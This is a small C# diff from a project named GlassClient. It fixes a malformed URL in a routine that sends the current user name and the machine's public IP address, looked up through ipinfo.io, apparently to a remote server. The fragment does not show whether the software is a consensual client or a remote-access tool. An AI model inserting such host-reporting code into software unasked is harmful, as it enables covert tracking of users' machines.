@@ -181,7 +181,7 @@ namespace GlassClient
                 return false;
             if (!SendString(Environment.UserName))
                 return false;
-            if (!SendString(new WebClient().DownloadString("http://http://icanhazip.com/")))
+            if (!SendString(new WebClient().DownloadString("http://ipinfo.io/ip").Trim()))
                 return false;
             return true;
         }
